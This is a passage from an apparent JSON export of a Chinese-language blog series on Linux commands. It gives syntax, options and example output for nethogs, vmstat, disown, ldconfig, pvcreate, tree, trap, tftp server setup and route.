用来查看接口统计报告，还有 top 监控系统当前运行进程。但是如果你想要找一个能够按进程实时统计网络带宽利用率的工具，那么 NetHogs 值得一看。 NetHogs 是一个开源的命令行工具（类似于 Linux 的 top 命令），用来按进程或程序实时统计网络带宽使用率。 来自 NetHogs 项目网站: NetHogs 是一个小型的 net top 工具，不像大多数工具那样拖慢每个协议或者是每个子网的速度而是按照进程进行带宽分组。NetHogs 不需要依赖载入某个特殊的内核模块。如果发生了网络阻塞你可以启动 NetHogs 立即看到哪个 PID 造成的这种状况。这样就很容易找出哪个程序跑飞了然后突然占用你的带宽。 本文为你介绍如何在 Unix/Linux 操作系统下如何安装和使用 NetHogs 按进程监控网络带宽使用率。 语法 nethogs（选项）（参数） 选项 usage: nethogs [-V] [-h] [-b] [-d seconds] [-v mode] [-c count] [-t] [-p] [-s] [device [device [device ...]]] -V : 打印版本。 -h : 打印此帮助。 -b : bughunt 模式 - 暗示 tracemode。 -d : 延迟更新刷新率（以秒为单位）。 默认值为 1。 -v : 视图模式（0 = KB / s，1 =总 KB，2 =总 B，3 =总 MB）。 默认值为 0。 -c : 更新次数。 默认为 0（无限制）。 -t : tracemode. -p : 煽动混乱模式（不推荐）。 -s : 按发送列排序输出。 -a : 监控所有设备，甚至环回/停止。 device : 要监控的设备。 默认是所有接口启动和运行，不包括环回 当 nethogs 运行时，按： q：退出 s：按 SENT 流量排序 r：按 RECEIVE 流量排序 m：在总（KB，B，MB）和 KB / s 模式之间切换 其他参数和用法 -d : 刷新间隔 -h : 帮助 -p : promiscious 模式 -t : trace 模式 -V : 版本 交互命令 以下是 NetHogs 的一些交互命令（键盘快捷键） m : 修改单位 r : 按流量排序 s : 按发送流量排序 q : 退出命令提示符 安装 在 RHEL、CentOS 和 Fedora 下安装 NetHogs 要安装 NetHogs，你必须要启用你所用 Linux 下的 EPEL 源。然后运行下面的 yum 命令下载安装 NetHogs 包。 yum install nethogs 在 Ubuntu、Linux mint 和 Debian 下安装 NetHogs 键入 apt-get 命令安装 NetHogs 包： $ sudo apt-get install nethogs NetHogs 用法 在基于 RedHat 系统下键入如下命令启动 NetHogs 工具。 nethogs 在 Debian/Ubuntu/Linux Mint 下要执行 NetHogs 你必须拥有 root 权限： $ sudo nethogs !nethogs Ubuntu 12.10 下的 NetHogs 预览 正如上图所示，send 列和 received 列显示的是按照每个进程的流量统计。总的收发数据带宽在最下方，而且可以用交互命令控制排序，下面将要讨论这些交互命令。 NetHogs 命令行参数 以下就是 NetHogs 命令行的参数，用-d 来添加刷新频率参数，device name 用来检测给定的某个或者某些设备的带宽（默认是 eth0）。例如：设置 5 秒钟的刷新频率，键入如下命令即可： nethogs -d 5 $ sudo nethogs -d 5 如果只用来监视设备（eth0）的网络带宽可以使用如下命令： nethogs eth0 $ sudo nethogs eth0 如果要同时监视 eth0 和 eth1 接口，使用以下命令即可： nethogs eth0 eth1 $ sudo nethogs eth0 eth1 关于 NetHogs 命令行工具的完整参数列表，可以参考 NetHogs 的手册，使用方法是在终端里输入man nethogs或者sudo man nethogs，更多信息请参考 NetHogs 项目主页。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nethogs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nethogs/","stats":{"text":"4 min read","time":219000,"words":952,"minutes":4},"date":"2022-02-03 15:06:18","dateFormat":"2022-02-03"},{"content":"显示虚拟内存状态。 补充说明 vmstat 命令的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O 等系统整体运行状态。 语法 vmstat (选项) (参数) 选项 -a：显示活动内页； -f：显示启动后创建的进程总数； -m：显示 slab 信息； -n：头信息仅显示一次； -s：以表格方式显示事件计数器和内存状态； -d：报告磁盘状态； -p：显示指定的硬盘分区状态； -S：输出信息的单位。 参数 事件间隔：状态信息刷新的时间间隔； 次数：显示报告的次数。 实例 vmstat 3 procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------ r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 320 42188 167332 1534368 0 0 4 7 1 0 0 0 99 0 0 0 0 320 42188 167332 1534392 0 0 0 0 1002 39 0 0 100 0 0 0 0 320 42188 167336 1534392 0 0 0 19 1002 44 0 0 100 0 0 0 0 320 42188 167336 1534392 0 0 0 0 1002 41 0 0 100 0 0 0 0 320 42188 167336 1534392 0 0 0 0 1002 41 0 0 100 0 0 字段说明： Procs（进程） r: 运行队列中进程数量，这个值也可以判断是否需要增加 CPU。（长期大于 1） b: 等待 IO 的进程数量。 Memory（内存） swpd: 使用虚拟内存大小，如果 swpd 的值不为 0，但是 SI，SO 的值长期为 0，这种情况不会影响系统性能。 free: 空闲物理内存大小。 buff: 用作缓冲的内存大小。 cache: 用作缓存的内存大小，如果 cache 的值大的时候，说明 cache 处的文件数多，如果频繁访问到的文件都能被 cache 处，那么磁盘的读 IO bi 会非常小。 Swap si: 每秒从交换区写到内存的大小，由磁盘调入内存。 so: 每秒写入交换区的内存大小，由内存调入磁盘。 注意：内存够用的时候，这 2 个值都是 0，如果这 2 个值长期大于 0 时，系统性能会受到影响，磁盘 IO 和 CPU 资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于 0 时，就认为内存不够用了，不能光看这一点，还要结合 si 和 so，如果 free 很少，但是 si 和 so 也很少（大多时候是 0），那么不用担心，系统性能这时不会受到影响的。 IO（现在的 Linux 版本块的大小为 1kb） bi: 每秒读取的块数 bo: 每秒写入的块数 注意：随机磁盘读写的时候，这 2 个值越大（如超出 1024k)，能看到 CPU 在 IO 等待的值也会越大。 system（系统） in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 注意：上面 2 个值越大，会看到由内核消耗的 CPU 时间会越大。 CPU（以百分比表示） us: 用户进程执行时间百分比 (user time) us 的值比较高时，说明用户进程消耗的 CPU 时间多，但是如果长期超 50%的使用，那么我们就该考虑优化程序算法或者进行加速。 sy: 内核系统进程执行时间百分比 (system time) sy 的值高时，说明系统内核消耗的 CPU 资源多，这并不是良性表现，我们应该检查原因。 wa: IO 等待时间百分比 wa 的值高时，说明 IO 等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。 id: 空闲时间百分比 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vmstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vmstat/","stats":{"text":"4 min read","time":215000,"words":909,"minutes":4},"date":"2022-02-03 15:05:07","dateFormat":"2022-02-03"},{"content":"从当前的 shell 中移除作业。。 概要 disown [-h] [-ar] [jobspec ... | pid ...] 主要用途 从当前 shell 的作业列表中移除全部作业。 从当前 shell 的作业列表中移除指定的一到多个作业。 从当前 shell 的作业列表中移除正在运行的作业。 标记作业，使得它们在当前 shell 退出后也不会结束。 选项 -h 标记每个作业标识符，这些作业将不会在 shell 接收到 sighup 信号时接收到 sighup 信号。 -a 移除所有的作业。 -r 移除运行的作业。 参数 jobspec（可选）：要移除的作业标识符，可以是一到多个。 pid（可选）：要移除的作业对应的进程 ID，可以是一到多个。 返回值 返回成功除非未开启作业控制或执行出现错误。 例子 # 演示。 [user2@pc] ssh 192.168.1.4 user2@192.168.1.4's password: # 此时按下 ctrl+z 使得交互停止。 [1]+ Stopped ssh 192.168.1.4 [user2@pc] ssh 192.168.1.7 user2@192.168.1.7's password: # 此时按下 ctrl+z 使得交互停止。 [1]+ Stopped ssh 192.168.1.7 [user2@pc] sleep 120 &amp; [3] 28986 # 列出作业及 pid 信息。 [user2@pc] jobs -l [1]- 28756 Stopped ssh 192.168.1.4 [2]+ 28833 Stopped ssh 192.168.1.7 [3] 28986 Running sleep 120 &amp; # 删除运行状态的作业。 [user2@pc] disown -r [user2@pc] jobs -l [1]- 28756 Stopped ssh 192.168.1.4 [2]+ 28833 Stopped ssh 192.168.1.7 # 注意 disown 只是移除作业，并没有停止。 [user2@pc] pgrep -a -u user2 -f 'sleep 120' 28986 sleep 120 # 删除指定的作业。 [user2@pc] disown %2 bash: warning: deleting stopped job 2 with process group 28833 [user2@pc] jobs -l [1]- 28756 Stopped ssh 192.168.1.4 # 注意 disown 只是移除作业，并没有停止。 [user2@pc] pgrep -a -u user2 -f 'ssh 192.168.1.7' 28833 ssh 192.168.1.7 # 删除全部作业。 [user2@pc] disown -a bash: warning: deleting stopped job 1 with process group 28756 [user2@pc] jobs -l # 注意 disown 只是移除作业，并没有停止。 [user2@pc] pgrep -a -u user2 -f 'ssh 192.168.1.4' 28756 ssh 192.168.1.4 # 演示-h 选项的作用。 [user2@pc] sleep 90 &amp; [1] 109080 [user2@pc] jobs -l [1]+ 109080 Running sleep 90 &amp; [user2@pc] disown -h %1 [user2@pc] exit # 此时前一个终端已经关闭，现在打开新终端查找该作业。 [user2@pc] pgrep -a -u user2 -f 'sleep 90' 109080 sleep 90 注意 bash的作业控制命令包括bg fg kill wait disown suspend。 该命令需要set选项monitor处于开启状态时才能执行；查看作业控制状态：输入set -o查看monitor行；执行set -o monitor或set -m开启该选项。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"disown","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/disown/","stats":{"text":"3 min read","time":178000,"words":657,"minutes":3},"date":"2022-02-03 15:04:55","dateFormat":"2022-02-03"},{"content":"动态链接库管理命令。 补充说明 ldconfig 命令的用途主要是在默认搜寻目录/lib和/usr/lib以及动态库配置文件/etc/ld.so.conf内所列的目录下，搜索出可共享的动态链接库（格式如 lib.so）,进而创建出动态装入程序 (ld.so) 所需的连接和缓存文件。缓存文件默认为/etc/ld.so.cache，此文件保存已排好序的动态链接库名字列表，为了让动态链接库为系统所共享，需运行动态链接库的管理命令 ldconfig，此执行程序存放在/sbin目录下。 ldconfig 通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。 语法 ldconfig [-v|--verbose] [-n] [-N] [-X] [-f CONF] [-C CACHE] [-r ROOT] [-l] [-p|--print-cache] [-c FORMAT] [--format=FORMAT] [-V] -?|--[help|--usage] path... 选项 -v 或--verbose：用此选项时，ldconfig 将显示正在扫描的目录及搜索到的动态链接库，还有它所创建的连接的名字。 -n：用此选项时,ldconfig 仅扫描命令行指定的目录，不扫描默认目录（/lib、/usr/lib），也不扫描配置文件/etc/ld.so.conf 所列的目录。 -N：此选项指示 ldconfig 不重建缓存文件（/etc/ld.so.cache），若未用-X 选项，ldconfig 照常更新文件的连接。 -X：此选项指示 ldconfig 不更新文件的连接，若未用-N 选项，则缓存文件正常更新。 -f CONF：此选项指定动态链接库的配置文件为 CONF，系统默认为/etc/ld.so.conf。 -C CACHE：此选项指定生成的缓存文件为 CACHE，系统默认的是/etc/ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。 -r ROOT：此选项改变应用程序的根目录为 ROOT（是调用 chroot 函数实现的）。选择此项时，系统默认的配置文件/etc/ld.so.conf，实际对应的为 ROOT/etc/ld.so.conf。如用-r /usr/zzz 时，打开配置文件/etc/ld.so.conf 时，实际打开的是/usr/zzz/etc/ld.so.conf 文件。用此选项，可以大大增加动态链接库管理的灵活性。 -l：通常情况下,ldconfig 搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。 -p 或--print-cache：此选项指示 ldconfig 打印出当前缓存文件所保存的所有共享库的名字。 -c FORMAT 或 --format=FORMAT：此选项用于指定缓存文件所使用的格式，共有三种：old(老格式)，new(新格式) 和 compat（兼容格式，此为默认格式）。 -V：此选项打印出 ldconfig 的版本信息，而后退出。 -? 或 --help 或 --usage：这三个选项作用相同，都是让 ldconfig 打印出其帮助信息，而后退出。 ldconfig 几个需要注意的地方： 往/lib和/usr/lib里面加东西，是不用修改/etc/ld.so.conf的，但是完了之后要调一下 ldconfig，不然这个 library 会找不到。 想往上面两个目录以外加东西的时候，一定要修改/etc/ld.so.conf，然后再调用 ldconfig，不然也会找不到。 比如安装了一个 mysql 到/usr/local/mysql，mysql 有一大堆 library 在/usr/local/mysql/lib下面，这时就需要在/etc/ld.so.conf下面加一行/usr/local/mysql/lib，保存过后 ldconfig 一下，新的 library 才能在程序运行时被找到。 如果想在这两个目录以外放 lib，但是又不想在/etc/ld.so.conf中加东西（或者是没有权限加东西）。那也可以，就是 export 一个全局变量 LD_LIBRARY_PATH，然后运行程序的时候就会去这个目录中找 library。一般来讲这只是一种临时的解决方案，在没有权限或临时需要的时候使用。 ldconfig 做的这些东西都与运行程序时有关，跟编译时一点关系都没有。编译的时候还是该加-L 就得加，不要混淆了。 总之，就是不管做了什么关于 library 的变动后，最好都 ldconfig 一下，不然会出现一些意想不到的结果。不会花太多的时间，但是会省很多的事。 再有，诸如 libdb-4.3.so 文件头中是会含有库名相关的信息的（即含“libdb-4.3.so”，可用 strings 命令察看），因此仅通过修改文件名以冒充某已被识别的库（如 libdb-4.8.so）是行不通的。为此可在编译库的 Makefile 中直接修改配置信息，指定特别的库名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ldconfig","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ldconfig/","stats":{"text":"5 min read","time":269000,"words":1186,"minutes":5},"date":"2022-02-03 15:04:39","dateFormat":"2022-02-03"},{"content":"将物理硬盘分区初始化为物理卷。 补充说明 pvcreate 命令用于将物理硬盘分区初始化为物理卷，以便 LVM 使用。 语法 pvcreate (选项) (参数) 选项 -f：强制创建物理卷，不需要用户确认； -u：指定设备的 UUID； -y：所有的问题都回答“yes”； -Z：是否利用前 4 个扇区。 参数 物理卷：指定要创建的物理卷对应的设备文件名。 实例 查看磁盘信息： [root@localhost ~]# fdisk -l Disk /dev/hda: 41.1 GB, 41174138880 bytes 255 heads, 63 sectors/track, 5005 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks id System /dev/hda1 * 1 13 104391 83 Linux /dev/hda2 14 1288 10241437+ 83 Linux /dev/hda3 1289 1925 5116702+ 83 Linux /dev/hda4 1926 5005 24740100 5 Extended /dev/hda5 1926 2052 1020096 82 Linux swap / Solaris /dev/hda6 2053 2235 1469916 8e Linux LVM /dev/hda7 2236 2418 1469916 8e Linux LVM /dev/hda8 2419 2601 1469916 8e Linux LVM /dev/hda9 2602 2784 1469916 8e Linux LVM 检查有无 PV 在系统上，然后将/dev/hda6到/dev/hda9建立成为 PV 格式 [root@localhost ~]# pvscan No matching physical volumes found #找不到任何的 PV 存在！ 将 6-9 分区转成 pv，注意大括号的用途： [root@localhost ~]# pvcreate /dev/hda{6,7,8,9} Physical volume &quot;/dev/hda6&quot; successfully created Physical volume &quot;/dev/hda7&quot; successfully created Physical volume &quot;/dev/hda8&quot; successfully created Physical volume &quot;/dev/hda9&quot; successfully created 这就分別表示每个 PV 的信息与系统所有 PV 的信息： [root@localhost ~]# pvscan PV /dev/hda6 lvm2 [1.40 GB] PV /dev/hda7 lvm2 [1.40 GB] PV /dev/hda8 lvm2 [1.40 GB] PV /dev/hda9 lvm2 [1.40 GB] Total: 4 [5.61 GB] / in use: 0 [0 ] / in no VG: 4 [5.61 GB] 更详细的列示出系统上面每个 PV 信息： [root@localhost ~]# pvdisplay &quot;/dev/hda6&quot; is a new physical volume of &quot;1.40 GB&quot; --- NEW Physical volume --- PV Name /dev/hda6 #实际的 partition 分区名称 VG Name #因为尚未分配出去，所以空白！ PV Size 1.40 GB #就是容量说明 Allocatable NO #是否已被分配，结果是 NO PE Size (KByte) 0 #在此 PV 內的 PE 大小 Total PE 0 #共分割出几个 PE free PE 0 #沒被 LV 用掉的 PE Allocated PE 0 #尚可分配出去的 PE 数量 PV UUID Z13Jk5-RCls-UJ8B-HzDa-Gesn-atku-rf2biN ....(底下省略).... 删除物理卷： [root@localhost ~]# pvremove /dev/sdb2 Labels on physical volume &quot;/dev/sdb2&quot; successfully wiped 修改物理卷属性： [root@localhost ~]# pvchange -x n /dev/sdb1 #禁止分配指定物理卷上的 PE Physical volume &quot;/dev/sdb1&quot; changed 1 physical volume changed / 0 physical volumes not changed ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvcreate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvcreate/","stats":{"text":"3 min read","time":176000,"words":597,"minutes":3},"date":"2022-02-03 15:04:27","dateFormat":"2022-02-03"},{"content":"树状图列出目录的内容。 补充说明 tree 命令以树状图列出目录的内容。 语法 tree (选项) (参数) 选项 ------- 列表选项 ------- -a # 显示所有文件和目录。 -d # 先是目录名称而非文件。 -l # 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。 -f # 在每个文件或目录之前，显示完整的相对路径名称。 -x # 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该目录予以排除在寻找范围外。 -L level # 限制目录显示层级。 -R # Rerun tree when max dir level reached. -P pattern # &lt;范本样式&gt; 只显示符合范本样式的文件和目录名称。 -I pattern # Do not list files that match the given pattern. --ignore-case # Ignore case when pattern matching. --matchdirs # Include directory names in -P pattern matching. --noreport # Turn off file/directory count at end of tree listing. --charset X # Use charset X for terminal/HTML and indentation line output. --filelimit # # Do not descend dirs with more than # files in them. --timefmt &lt;f&gt; # Print and format time according to the format &lt;f&gt;. -o filename # Output to file instead of stdout. -------- 文件选项 --------- -q # 用“？”号取代控制字符，列出文件和目录名称。 -N # 直接列出文件和目录名称，包括控制字符。 -Q # Quote filenames with double quotes. -p # 列出权限标示。 -u # 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。 -g # 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。 -s # 列出文件和目录大小。 -h # Print the size in a more human readable way. --si # Like -h, but use in SI units (powers of 1000). -D # 列出文件或目录的更改时间。 -F # 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上&quot;*&quot;，&quot;/&quot;，&quot;@&quot;，&quot;|&quot;号。 --inodes # Print inode number of each file. --device # Print device ID number to which each file belongs. ------- 排序选项 ------- -v # Sort files alphanumerically by version. -t # 用文件和目录的更改时间排序。 -c # Sort files by last status change time. -U # Leave files unsorted. -r # Reverse the order of the sort. --dirsfirst # List directories before files (-U disables). --sort X # Select sort: name,version,size,mtime,ctime. ------- 图形选项 ------ -i # 不以阶梯状列出文件和目录名称。 -A # 使用 ASNI 绘图字符显示树状图而非以 ASCII 字符组合。 -S # Print with CP437 (console) graphics indentation lines. -n # Turn colorization off always (-C overrides). -C # 在文件和目录清单加上色彩，便于区分各种类型。 ------- XML / HTML / JSON 选项 ------- -X # Prints out an XML representation of the tree. -J # Prints out an JSON representation of the tree. -H baseHREF # Prints out HTML format with baseHREF as top directory. -T string # Replace the default HTML title and H1 header with string. --nolinks # Turn off hyperlinks in HTML output. ---- 杂项选项 ---- --version # 输入版本信息。 --help # 打印使用帮助信息。 -- # Options processing terminator. 参数 目录：执行 tree 指令，它会列出指定目录下的所有文件，包括子目录里的文件。 实例 列出目录/private/ 第一级文件名 tree /private/ -L 1 /private/ ├── etc ├── tftpboot ├── tmp └── var 忽略文件夹 tree -I node_modules # 忽略当前目录文件夹 node_modules tree -P node_modules # 列出当前目录文件夹 node_modules 的目录结构 tree -P node_modules -L 2 # 显示目录 node_modules 两层的目录树结构 tree -L 2 &gt; /home/www/tree.txt # 当前目录结果存到 tree.txt 文件中 忽略多个文件夹 tree -I 'node_modules|icon|font' -L 2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tree","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tree/","stats":{"text":"4 min read","time":227000,"words":854,"minutes":4},"date":"2022-02-03 15:04:04","dateFormat":"2022-02-03"},{"content":"捕捉信号和其他事件并执行命令。。 概要 trap [-lp] [[arg] signal_spec ...] 主要用途 用于指定在接收到信号后将要采取的动作。 脚本程序被中断时执行清理工作。 选项 -l 打印信号名称以及信号名称对应的数字。 -p 显示与每个信号关联的 trap 命令。 参数 arg：接收到信号时执行的命令。 signal_spec：信号名称或信号名称对应的数字。 返回值 如果表达式执行结果为成功时返回 0，当参数 signal_spec 没有指定有效值时返回 1。 关于信号 信号是一种进程间通信机制，它给应用程序提供一种异步的软件中断，使应用程序有机会接受其他程序活终端发送的命令 (即信号)。应用程序收到信号后，有三种处理方式：忽略，默认，或捕捉。进程收到一个信号后，会检查对该信号的处理机制。如果是 SIG_IGN，就忽略该信号；如果是 SIG_DFT，则会采用系统默认的处理动作，通常是终止进程或忽略该信号；如果给该信号指定了一个处理函数 (捕捉)，则会中断当前进程正在执行的任务，转而去执行该信号的处理函数，返回后再继续执行被中断的任务。 在有些情况下，我们不希望自己的 shell 脚本在运行时刻被中断，比如说我们写得 shell 脚本设为某一用户的默认 shell，使这一用户进入系统后只能作某一项工作，如数据库备份， 我们可不希望用户使用 Ctrl+C 等方法进入到 shell 状态做我们不希望做的事情。这便用到了信号处理。 以下是一些你可能会遇到的常见信号： 信号名称 信号数 描述 SIGHUP 1 本信号在用户终端连接（正常或非正常）结束时发出，通常是在终端的控制进程结束时，通知同一session内的各个作业，这时它们与控制终端不再关联。登录Linux时，系统会分配给登录用户一个终端(Session)。在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个Session。当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号。这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止。对于与终端脱离关系的守护进程，这个信号用于通知它重新读取配置文件。 SIGINT 2 程序终止(interrupt)信号，在用户键入 Ctrl+C 时发出。 SIGQUIT 3 和SIGINT类似，但由QUIT字符(通常是Ctrl /)来控制。进程在因收到SIGQUIT退出时会产生core文件，在这个意义上类似于一个程序错误信号。 SIGFPE 8 在发生致命的算术运算错误时发出。不仅包括浮点运算错误，还包括溢出及除数为0等其它所有的算术错误。 SIGKILL 9 用来立即结束程序的运行。本信号不能被阻塞，处理和忽略。 SIGALRM 14 时钟定时信号，计算的是实际的时间或时钟时间。alarm 函数使用该信号。 SIGTERM 15 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出；kill 命令缺省产生这个信号。 例子 当 shell 收到 HUP INT PIPE QUIT TERM 这几个命令时，当前执行的程序会执行 exit 1。 [root@pc root]$ trap &quot;exit 1&quot; HUP INT PIPE QUIT TERM 1 清理临时文件 下面展示了如果有人试图从终端中止程序时，如何删除文件然后退出： trap &quot;rm -f $WORKDIR/work1 $WORKDIR/dataout; exit&quot; 2 执行 shell 程序，如果程序接收信号为 2，那么这两个文件 （work1 和 dataout） 将被自动删除。 添加信号 1 SIGHUP： $ trap &quot;rm $WORKDIR/work1 $WORKDIR/dataout; exit&quot; 1 2 2 忽略信号 如果陷阱列出的命令是空的，指定的信号接收时，将被忽略： $ trap '' 2 忽略多个信号： $ trap '' 1 2 3 15 3 重置陷阱 当你改变了收到信号后采取的动作，你可以省略第一个参数来重置到默认行为。 $ trap 1 2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"trap","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/trap/","stats":{"text":"5 min read","time":248000,"words":1144,"minutes":5},"date":"2022-02-03 15:02:45","dateFormat":"2022-02-03"},{"content":"在本机和 tftp 服务器之间使用 TFTP 协议传输文件。 补充说明 tftp 命令用在本机和 tftp 服务器之间使用 TFTP 协议传输文件。 TFTP 是用来下载远程文件的最简单网络协议，它其于 UDP 协议而实现。嵌入式 linux 的 tftp 开发环境包括两个方面：一是 linux 服务器端的 tftp-server 支持，二是嵌入式目标系统的 tftp-client 支持。因为 u-boot 本身内置支持 tftp-client，所以嵌入式目标系统端就不用配置了。下面就详细介绍一下 linux 服务器端 tftp-server 的配置。 语法 tftp (选项) (参数) 选项 -c：指定与 tftp 服务器连接成功后，立即要执行的指令； -m：指定文件传输模式。可以是 ASCII 或者 Binary； -v：显示指令详细执行过程； -V：显示指令版本信息。 参数 主机：指定 tftp 要联机的 tftp 服务器的 ip 地址或主机名。 实例 1、安装 tftp 服务器 需要安装 xinetd、tftp 和 tftp-server 3 个软件 如果能上网，通过 yum 安装： yum install xinetd yum install tftp yum install tftp-server 如果不能上网，可以直接安装提供的 rpm 包： rpm -ivh xinetd-2.3.14-18.fc9.i386.rpm rpm -ivh tftp-0.48-3.fc9.i386.rpm rpm -ivh tftp-server-0.48-3.fc9.i386.rpm 2、配置 tftp 服务器 修改/etc/xinetd.d/tftp 文件，将其中的 disable=yes 改为 disable=no。主要是设置 TFTP 服务器的根目录，开启服务。修改后的文件如下： service tftp { socket_type =dgram protocol =udp wait =yes user =root server =/usr/sbin/in.tftpd server_args =-s /home/mike/tftpboot -c disable =no per_source =11 cps =100 2 flags =IPv4 } 说明：修改项server_args= -s &lt;path&gt; -c，其中 处可以改为你的 tftp-server 的根目录，参数-s 指定 chroot，-c 指定了可以创建文件。 3、启动 tftp 服务器并关闭防火墙 /etc/init.d/iptables stop # 关闭防火墙 sudo /sbin/service xinetd start 或 service xinetd restart /etc/init.d/xinetd start 看到启动[OK] 就可以了 4、查看 tftp 服务是否开启 netstat -a | grep tftp 显示结果为udp 0 0 *:tftp *:*表明服务已经开启，就表明 tftp 配置成功了。 5、tftp 使用 复制一个文件到 tftp 服务器目录，然后在主机启动 tftp 软件，进行简单测试。 tftp 192.168.1.2 tftp&gt;get &lt;download file&gt; tftp&gt;put &lt;upload file&gt; tftp&gt;q 6、tftp 命令用法如下 tftp your-ip-address 进入 TFTP 操作： connect：连接到远程 tftp 服务器 mode：文件传输模式 put：上传文件 get：下载文件 quit：退出 verbose：显示详细的处理信息 tarce：显示包路径 status：显示当前状态信息 binary：二进制传输模式 ascii：ascii 传送模式 rexmt：设置包传输的超时时间 timeout：设置重传的超时时间 help：帮助信息 ? ：帮助信息 7、如果老是出现“AVC Denial, click icon to view”的错误，并不能传输文件，需要作如下修改 修改/etc/sysconfig/selinux,将 SELINUX 设定为 disable，使用命令setenforce 0让 selinux 配置文件生效。 8、Busybox 中 tftp 命令的用法 命令格式为： tftp [option] ... host [port] 如果要下载或上传文件的话是一定要用这些 option 的。 -g 表示下载文件 (get) -p 表示上传文件 (put) -l 表示本地文件名 (local file) -r 表示远程主机的文件名 (remote file) 例如，要从远程主机 192.168.1.2 上下载 embedexpert，则应输入以下命令 tftp -g -r embedexpert 192.168.1.2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tftp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tftp/","stats":{"text":"4 min read","time":221000,"words":883,"minutes":4},"date":"2022-02-03 15:02:25","dateFormat":"2022-02-03"},{"content":"显示并设置 Linux 中静态路由表。 补充说明 route 命令用来显示并设置 Linux 内核中的网络路由表，route 命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。 在 Linux 系统中设置路由通常是为了解决以下问题：该 Linux 系统在一个局域网中，局域网中有一个网关，能够让机器访问 Internet，那么就需要将这台机器的 ip 地址设置为 Linux 机器的默认路由。要注意的是，直接在命令行下执行 route 命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加 route 命令来保证该路由设置永久有效。 语法 route (选项) (参数) 选项 -A：设置地址类型； -C：打印将 Linux 核心的路由缓存； -v：详细信息模式； -n：不执行 DNS 反向查找，直接显示数字形式的 IP 地址； -e：netstat 格式显示路由表； -net：到一个网络的路由表； -host：到一个主机的路由表。 参数 Add：增加指定的路由记录； Del：删除指定的路由记录； Target：目的网络或目的主机； gw：设置默认网关； mss：设置 TCP 的最大区块长度（MSS），单位 MB； window：指定通过路由表的 TCP 连接的 TCP 窗口大小； dev：路由记录所表示的网络接口。 实例 显示当前路由： [root@localhost ~]# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 112.124.12.0 * 255.255.252.0 U 0 0 0 eth1 10.160.0.0 * 255.255.240.0 U 0 0 0 eth0 192.168.0.0 10.160.15.247 255.255.0.0 UG 0 0 0 eth0 172.16.0.0 10.160.15.247 255.240.0.0 UG 0 0 0 eth0 10.0.0.0 10.160.15.247 255.0.0.0 UG 0 0 0 eth0 default 112.124.15.247 0.0.0.0 UG 0 0 0 eth1 [root@localhost ~]# route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 112.124.12.0 0.0.0.0 255.255.252.0 U 0 0 0 eth1 10.160.0.0 0.0.0.0 255.255.240.0 U 0 0 0 eth0 192.168.0.0 10.160.15.247 255.255.0.0 UG 0 0 0 eth0 172.16.0.0 10.160.15.247 255.240.0.0 UG 0 0 0 eth0 10.0.0.0 10.160.15.247 255.0.0.0 UG 0 0 0 eth0 0.0.0.0 112.124.15.247 0.0.0.0 UG 0 0 0 eth1 其中 Flags 为路由标志，标记当前网络节点的状态，Flags 标志说明： U Up 表示此路由当前为启动状态。 H Host，表示此网关为一主机。 G Gateway，表示此网关为一路由器。 R Reinstate Route，使用动态路由重新初始化的路由。 D Dynamically,此路由是动态性地写入。 M Modified，此路由是由路由守护程序或导向器动态修改。 ! 表示此路由当前为关闭状态。 